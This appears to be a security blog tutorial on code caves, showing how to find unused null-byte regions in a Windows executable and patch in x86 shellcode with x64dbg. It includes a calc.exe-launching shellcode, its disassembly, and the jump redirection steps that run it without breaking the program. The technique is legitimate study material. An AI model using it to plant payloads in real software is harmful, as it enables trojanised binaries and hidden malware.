---
title: "Using code caves to inject custom shellcode"
classes: wide
header:
  teaser: /assets/images/injection/codecaves/codecaves.png
ribbon: DodgerBlue
description: "Learn how to use code caves to inject custom code into a .exe file"
categories:
  - Injection
toc: true
---

# Code caves

First of all, **what are code caves?**

Code caves are a chunk of null bytes (`0x00`) in a process's memory. Here's how they look like in `x64dbg`:

![Code cave chunk, x64dbg](/assets/images/injection/codecaves/codecaves.png)

# How to find these code caves?

Most of the times, it's pretty easy. Just open the target process with `x64dbg` and scroll down to the end until you see a bunch of these null instructions:
```c
0040269D | 0000                     | add byte ptr ds:[eax],al                |
0040269F | 0000                     | add byte ptr ds:[eax],al                |
004026A1 | 0000                     | add byte ptr ds:[eax],al                |
004026A3 | 0000                     | add byte ptr ds:[eax],al                |
004026A5 | 0000                     | add byte ptr ds:[eax],al                |
004026A7 | 0000                     | add byte ptr ds:[eax],al                |
004026A9 | 0000                     | add byte ptr ds:[eax],al                |
```
You can then paste your shellcode in place of these null instructions (tutorial below).

If you want, you can also use Cheat Engine's "Scan for code caves" feature:


![Writing our shellcode](/assets/images/injection/codecaves/scan.png)

Then untick "*Also scan non-executable read only memory*" (because we want to inject executable shellcode):
![Clicking](/assets/images/injection/codecaves/click.png)

You'll then be able to see a list of many empty executable addresses within the process's memory state, that you can use to write your shellcode in:
![Code cave addresses](/assets/images/injection/codecaves/addresses.png)



As you may know, we can take advantage of these unused bytes to directly inject raw executable opcodes (shellcode) within the application.

We can use this simple **x86 shellcode** that opens a calculator (`calc.exe`):


```c

// open calc.exe (195 bytes x86 shellcode).
unsigned char shellcode[] = 
"\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"
"\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"
"\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"
"\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"
"\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"
"\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"
"\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"
"\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"
"\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"
"\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff"
"\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f"
"\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2"
"\x52\xff\xd0";
```

First, we'll go to the shellcode, and add the following instructions:

```asm
pushad
pushfd
```

The x86 instruction `pushad` pushes all of the general-purpose register onto the stack, and the `pushfd` instruction pushes all the `EFLAGS` register onto the stack.

We need these instructions because we'll need to restore the original register state and jump back to the original execution flow after executing our shellcode:
![Writing initial instructions](/assets/images/injection/codecaves/codecaves1.png)


We can then paste our shellcode after those 2 initial instructions:

![Writing our shellcode](/assets/images/injection/codecaves/pasting.png)

We now have this code instead of the initial `0x00` bytes:
```c
00401D5D | 60                       | pushad                                  | // <--- Pushes the contents of the general-purpose registers onto the stack
00401D5E | 9C                       | pushfd                                  | // <--- Pushes the entire contents of the EFLAGS register onto the stack
00401D5F | 89E5                     | mov ebp,esp                             | // We now paste our shellcode
00401D61 | 83EC 20                  | sub esp,20                              |
00401D64 | 31DB                     | xor ebx,ebx                             |
00401D66 | 64:8B5B 30               | mov ebx,dword ptr fs:[ebx+30]           |
00401D6A | 8B5B 0C                  | mov ebx,dword ptr ds:[ebx+C]            |
00401D6D | 8B5B 1C                  | mov ebx,dword ptr ds:[ebx+1C]           |
00401D70 | 8B1B                     | mov ebx,dword ptr ds:[ebx]              |
00401D72 | 8B1B                     | mov ebx,dword ptr ds:[ebx]              |
00401D74 | 8B43 08                  | mov eax,dword ptr ds:[ebx+8]            |
00401D77 | 8945 FC                  | mov dword ptr ss:[ebp-4],eax            |
00401D7A | 8B58 3C                  | mov ebx,dword ptr ds:[eax+3C]           |
00401D7D | 01C3                     | add ebx,eax                             |
00401D7F | 8B5B 78                  | mov ebx,dword ptr ds:[ebx+78]           |
00401D82 | 01C3                     | add ebx,eax                             |
00401D84 | 8B7B 20                  | mov edi,dword ptr ds:[ebx+20]           | edi:EntryPoint
00401D87 | 01C7                     | add edi,eax                             | edi:EntryPoint
00401D89 | 897D F8                  | mov dword ptr ss:[ebp-8],edi            | edi:EntryPoint
00401D8C | 8B4B 24                  | mov ecx,dword ptr ds:[ebx+24]           | ecx:EntryPoint
00401D8F | 01C1                     | add ecx,eax                             | ecx:EntryPoint
00401D91 | 894D F4                  | mov dword ptr ss:[ebp-C],ecx            | ecx:EntryPoint
00401D94 | 8B53 1C                  | mov edx,dword ptr ds:[ebx+1C]           | edx:EntryPoint
00401D97 | 01C2                     | add edx,eax                             | edx:EntryPoint
00401D99 | 8955 F0                  | mov dword ptr ss:[ebp-10],edx           | edx:EntryPoint
00401D9C | 8B53 14                  | mov edx,dword ptr ds:[ebx+14]           | edx:EntryPoint
00401D9F | 8955 EC                  | mov dword ptr ss:[ebp-14],edx           | edx:EntryPoint
00401DA2 | EB 32                    | jmp codecaving.401DD6                   |
00401DA4 | 31C0                     | xor eax,eax                             |
00401DA6 | 8B55 EC                  | mov edx,dword ptr ss:[ebp-14]           | edx:EntryPoint
00401DA9 | 8B7D F8                  | mov edi,dword ptr ss:[ebp-8]            | edi:EntryPoint
00401DAC | 8B75 18                  | mov esi,dword ptr ss:[ebp+18]           | esi:EntryPoint
00401DAF | 31C9                     | xor ecx,ecx                             | ecx:EntryPoint
00401DB1 | FC                       | cld                                     |
00401DB2 | 8B3C87                   | mov edi,dword ptr ds:[edi+eax*4]        | edi:EntryPoint
00401DB5 | 037D FC                  | add edi,dword ptr ss:[ebp-4]            | edi:EntryPoint
00401DB8 | 66:83C1 08               | add cx,8                                |
00401DBC | F3:A6                    | repe cmpsb                              |
00401DBE | 74 05                    | je codecaving.401DC5                    |
00401DC0 | 40                       | inc eax                                 |
00401DC1 | 39D0                     | cmp eax,edx                             | edx:EntryPoint
00401DC3 | 72 E4                    | jb codecaving.401DA9                    |
00401DC5 | 8B4D F4                  | mov ecx,dword ptr ss:[ebp-C]            | ecx:EntryPoint
00401DC8 | 8B55 F0                  | mov edx,dword ptr ss:[ebp-10]           | edx:EntryPoint
00401DCB | 66:8B0441                | mov ax,word ptr ds:[ecx+eax*2]          |
00401DCF | 8B0482                   | mov eax,dword ptr ds:[edx+eax*4]        |
00401DD2 | 0345 FC                  | add eax,dword ptr ss:[ebp-4]            |
00401DD5 | C3                       | ret                                     |
00401DD6 | BA 78786563              | mov edx,63657878                        | edx:EntryPoint
00401DDB | C1EA 08                  | shr edx,8                               | edx:EntryPoint
00401DDE | 52                       | push edx                                | edx:EntryPoint
00401DDF | 68 57696E45              | push 456E6957                           |
00401DE4 | 8965 18                  | mov dword ptr ss:[ebp+18],esp           |
00401DE7 | E8 B8FFFFFF              | call codecaving.401DA4                  |
00401DEC | 31C9                     | xor ecx,ecx                             | ecx:EntryPoint
00401DEE | 51                       | push ecx                                | ecx:EntryPoint
00401DEF | 68 2E657865              | push 6578652E                           |
00401DF4 | 68 63616C63              | push 636C6163                           |
00401DF9 | 89E3                     | mov ebx,esp                             |
00401DFB | 41                       | inc ecx                                 | ecx:EntryPoint
00401DFC | 51                       | push ecx                                | ecx:EntryPoint
00401DFD | 53                       | push ebx                                |
00401DFE | FFD0                     | call eax                                |
00401E00 | E8 A5020000              | call codecaving.4020AA                  | // end of shellcode
```

Now, after we pasted our shellcode, we need to modify our exe's code so that we `jmp` to the address of the start of the shellcode (`00401D5D`),

and then add a jmp instruction at the *end* of the shellcode to `jmp` back to the original execution flow (so that we don't break the program).

I chose this instruction to modify:
```c
jmp 0x00401D14
```
So first, let's modify that instruction instruction to `jmp` to the start of our shellcode (at address `00401D5D`) instead of `00401D14`

So instead of `jmp 0x00401D14`, it will be `jmp 00401D5D`:
![Jumping to our shellcode](/assets/images/injection/codecaves/oep.png)

And then at the end of our shellcode, we `jmp` to the actual instruction that the original `jmp` went to (`0x00401D14`):

![Jumping to our shellcode](/assets/images/injection/codecaves/end.png)

Now, after applying our patches in `x64dbg`, we can see that the program also launches `calc.exe` alongside its original payload:

![Successfully opening calc.exe](/assets/images/injection/codecaves/success.png)

Later, I'll explain how to inject shellcode in x64 processes. Stay tuned!
